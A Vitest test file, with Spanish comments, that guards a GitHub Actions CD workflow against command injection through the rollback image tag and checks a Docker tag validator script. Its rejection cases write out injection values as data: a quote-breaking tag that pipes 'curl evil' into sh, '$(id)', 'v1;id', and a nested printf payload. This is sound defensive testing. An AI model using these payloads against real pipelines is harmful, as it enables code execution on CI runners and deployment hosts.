import { spawnSync } from "node:child_process";
import { readFileSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";

// ============================================================================
//  CD: los datos que elige quien dispara el workflow NUNCA son código.
//
//  GitHub sustituye `${{ … }}` como TEXTO antes de que bash (o el shell del host
//  remoto, vía appleboy/ssh-action) lo parsee. Interpolar `inputs.*`,
//  `steps.*.outputs.*` o `needs.*.outputs.*` dentro de un `run:`/`script:` deja
//  que el valor inyecte comandos: el `image_tag` del rollback se ejecutaría en
//  el runner (con `packages: write`) y en el host de despliegue.
//
//  La invariante: la etiqueta entra por `env:`, se valida contra la gramática de
//  Docker antes de cualquier uso, los outputs se escriben con `printf` y la
//  referencia de imagen se pasa al SSH por `envs`.
// ============================================================================

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../../..");
const CD = readFileSync(path.join(ROOT, ".github/workflows/cd.yml"), "utf8");
const VALIDATOR = path.join(ROOT, ".github/scripts/validate-image-tag.sh");

/**
 * Bloques de shell del workflow (`run: |` y `script: |`), con la línea donde
 * empieza la clave. Basta para lo que se comprueba aquí: no interpreta YAML,
 * solo recoge las líneas más indentadas que la clave.
 */
function shellBlocks(
  source: string,
): Array<{ key: string; body: string; line: number }> {
  const lines = source.split("\n");
  const blocks: Array<{ key: string; body: string; line: number }> = [];

  for (let i = 0; i < lines.length; i++) {
    const match = /^(\s*)(run|script):\s*\|[-+]?\s*$/.exec(lines[i]!);
    if (!match) continue;

    const indent = match[1]!.length;
    const body: string[] = [];
    let next = i + 1;
    for (; next < lines.length; next++) {
      const line = lines[next]!;
      if (line.trim() !== "" && line.search(/\S/) <= indent) break;
      body.push(line);
    }

    blocks.push({ key: match[2]!, body: body.join("\n"), line: i + 1 });
    i = next - 1;
  }

  return blocks;
}

function validate(tag: string) {
  const result = spawnSync("bash", [VALIDATOR, tag], { encoding: "utf8" });
  return {
    status: result.status,
    stdout: result.stdout,
    stderr: result.stderr,
  };
}

const META_STEP = CD.slice(
  CD.indexOf("Validar y resolver tag de imagen"),
  CD.indexOf("Login en GHCR"),
);

describe("CD: expresiones de GitHub fuera del código shell", () => {
  it("ningún run:/script: interpola inputs, steps o needs", () => {
    const offenders = shellBlocks(CD).flatMap(({ key, body, line }) =>
      [...body.matchAll(/\$\{\{\s*(?:inputs|steps|needs)\./g)].map(
        (match) => `${key}:${line}: ${match[0]}`,
      ),
    );

    expect(offenders).toEqual([]);
  });

  it("el image_tag del dispatch entra por env: y se valida antes de usarse", () => {
    expect(META_STEP).toMatch(/env:\s*\n\s*IMAGE_TAG: \$\{\{ inputs\.image_tag \}\}/);
    expect(META_STEP).toContain(".github/scripts/validate-image-tag.sh");
  });

  it("los outputs se escriben con printf, no con echo sin escapar", () => {
    expect(META_STEP).toMatch(/printf 'tag=%s\\n'/);
    expect(META_STEP).toMatch(/printf 'image_ref=%s:%s\\n'/);
    expect(META_STEP).not.toMatch(/echo "image_ref=/);
  });

  it("la referencia de imagen viaja al host por envs, no dentro del script", () => {
    expect(CD).toContain("envs: FRONTEND_IMAGE");
    expect(CD).toContain("FRONTEND_IMAGE: ${{ needs.build-push.outputs.image_ref }}");
    expect(CD).not.toMatch(/export FRONTEND_IMAGE="\$\{\{/);
  });
});

describe("validate-image-tag.sh: la etiqueta es dato", () => {
  it.each([
    ["v1", "etiqueta corta"],
    ["v1.2.3", "semver"],
    ["manual-abc1234", "la que genera el propio CD"],
    ["V1_2-rc.1", "mayúsculas, guion bajo y punto"],
    ["a".repeat(128), "el máximo de Docker"],
  ])("acepta %s (%s)", (tag) => {
    const result = validate(tag);

    expect(result.status, result.stderr).toBe(0);
    expect(result.stdout).toBe(`${tag}\n`);
  });

  it.each([
    ["", "vacía"],
    ["a".repeat(129), "más de 128 caracteres"],
    ['x"; curl evil|sh #', "ruptura de comillas con comando"],
    ["$(id)", "sustitución de comando"],
    ["v1;id", "separador de comandos"],
    ["v1 tag", "espacio"],
    ["v1\tfoo", "tabulador"],
    ["v1\nfoo", "salto de línea"],
    ["-v1", "empieza por guion"],
    [".v1", "empieza por punto"],
    ["v1/foo", "barra"],
    ["v1:foo", "dos puntos"],
  ])("rechaza %j (%s)", (tag) => {
    const result = validate(tag);

    expect(result.status).not.toBe(0);
    expect(result.stdout).toBe("");
    expect(result.stderr).not.toBe("");
  });

  it("el payload del hallazgo no se cuela como etiqueta válida", () => {
    const payload = `$(printf 'v1"; echo REMOTE-CMD-RAN; echo "'; echo RUNNER-CMD-RAN >/dev/stderr)`;

    expect(validate(payload).status).not.toBe(0);
  });
});
